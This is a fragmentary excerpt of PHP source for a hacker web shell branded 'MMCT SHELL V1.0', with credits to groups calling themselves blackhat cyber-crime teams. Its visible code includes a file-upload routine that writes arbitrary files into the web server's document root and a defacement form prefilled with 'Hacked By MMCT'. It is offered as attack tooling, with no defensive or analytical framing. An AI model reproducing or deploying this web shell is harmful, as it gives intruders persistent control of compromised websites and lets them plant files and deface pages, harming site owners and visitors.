...
if (version_compare(PHP_VERSION, '8.0.0', '<')) {
   if (get_magic_quotes_gpc()) {
      function mmct($array)
      {
         return is_array($array) ? array_map('mmct', $array) : stripslashes($array);
      }
      $_POST = mmct($_POST);
   }
}
...
?>
   ...
   <head>
      ...
      <link rel="icon" href="https://h.top4top.io/p_29880q1049.png" type="image/png">
      <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css" />
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
      <title>MMCT SHELL V1.0</title>
   ...
   <body class="bg-info">
      <nav class="navbar navbar-expand-md bg-dark navbar-dark">
         <a class="navbar-brand" href="<?= $_SERVER['PHP_SELF'] ?>">
            <img src="https://h.top4top.io/p_29880q1049.png" alt="logo" style="width: 150px">
         </a>
         ...
         <div class="collapse navbar-collapse" id="collapsibleNavbar">
            <ul class="navbar-nav">
               ...
               <li class="nav-item">
                  <button class="btn btn-outline-secondary border-0">
                     <a class="nav-link" data-toggle="collapse" href="#info" role="button" data-target="#info" aria-expanded="false" aria-controls="info">Info System</a>
                  </button>
               </li>
               <li class="nav-item">
                  <button class="btn btn-outline-secondary border-0">
                     <a class="nav-link" data-toggle="collapse" href="#tool" role="button" data-target="#tool" aria-expanded="false" aria-controls="tool">Tools</a>
                  </button>
               </li>
            </ul>
         </div>
      ...
      <div class="container">
         ...
         if ($_GET['opt'] == 'upload') {
            ...
            if ($_POST['upload']) {
               if ($_POST['type_upload'] == 'noroot') {
                  if (@copy($_FILES['mmctfile']['tmp_name'], "$dir/" . $_FILES['mmctfile']['name'])) {
                     $act = "Uploaded! at <i><b>$dir/" . $_FILES['mmctfile']['name'] . "</b></i>";
                  } else {
                     $act = "failed to upload file";
                  }
               } else {
                  $root = $_SERVER['DOCUMENT_ROOT'] . "/" . $_FILES['mmctfile']['name'];
                  $web = $_SERVER['HTTP_HOST'] . "/" . $_FILES['mmctfile']['name'];

                  if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
                     if (@copy($_FILES['mmctfile']['tmp_name'], $root)) {
         ...
         ?>
                     ...
                     <div class="card-body bg-dark text-white">
                        <form method="POST" enctype="multipart/form-data">
                           ...
                           <div class="row form-group mx-lg-n5">
                              <input type="file" name="mmctfile" class="col form-control-file py-3 px-lg-5">
                           </div>
            ...
            <form method="POST">
               ...
               <div class="form-group">
                  <div class="mb-3">
                     <textarea class="form-control" name="script" placeholder="Hacked By MMCT" rows="5"></textarea>
                  </div>
               </div>
               <div class="form-group">
                  <div class="mb-3">
         ...
         if (is_dir($dir) == true) {
            ...
            ?>
               ...
               <div class="jumbotron text-center bg-dark" style="margin-bottom:0">
                  ...
                  <h3 class="mb-3">
                     <a target="_blank" href="https://github.com/sonydevv/">
                        <i class="fab fa-github"></i>
                     </a>
                     <a target="_blank" href="https://mmct.blogspot.com/">
                        <i class="fab fa-blogger"></i>
                     </a>
                     <a target="_blank" href="https://www.youtube.com/sonymodderr">
                        <i class="fab fa-youtube"></i>
                     </a>
                     <a target="_blank" href="https://wa.me/+6283861516857">
                     ...
                     <div class="modal-dialog">
                        <div class="modal-content">
                           ...
                           <div class="modal-body">
                              <p>MukoMuko Cyber Team</p>
                              <p>Jakarta BlackHat Cyber Crime</p>
                              <p>KaliMalang BlackHat Team</p>
                              <p>Nigeria Cyber Force</p>
                           </div>
                  ...
                  <div id="friend" class="modal fade" role="dialog">
                     <div class="modal-dialog">
                        <div class="modal-content">
                           ...
                           <div class="modal-body">
                              <p class="text-wrap">
                                 SonySec07 - ClutSert03 - Pyscodess - CurutG0D403 - TN.Cuplis - BentoSec21 - AmiGamer404 - Dark_Wonder23
                              </p>
                           </div>
                           <div class="modal-footer">
                              <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
